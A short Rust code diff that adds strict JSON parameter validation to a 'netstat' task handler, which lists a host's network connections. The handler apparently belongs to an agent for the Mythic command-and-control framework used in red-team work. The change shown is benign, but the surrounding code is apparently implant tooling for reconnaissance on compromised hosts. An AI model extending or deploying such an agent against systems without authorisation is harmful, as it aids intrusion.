@@ -5,6 +5,7 @@
 //! Windows: uses `netstat -ano`
 
 use mythic::{TaskMessage, TaskResponse};
+use serde::Deserialize;
 use serde::Serialize;
 
 #[allow(unused_imports)]
@@ -323,7 +324,20 @@ fn list_connections() -> Result<Vec<NetEntry>, String> {
 
 // ── Main handler ────────────────────────────────────────────
 
+#[derive(Deserialize, Default)]
+#[serde(deny_unknown_fields)]
+struct Params {}
+
 pub fn handle(task: &TaskMessage) -> TaskResponse {
+    let parameters = task.parameters.trim();
+    let parameters = if parameters.is_empty() {
+        "{}"
+    } else {
+        parameters
+    };
+    if let Err(e) = serde_json::from_str::<Params>(parameters) {
+        return TaskResponse::failed(task.id, &format!("netstat parse error: {e}"));
+    }
     match list_connections() {
         Ok(entries) => {
             let count = entries.len();
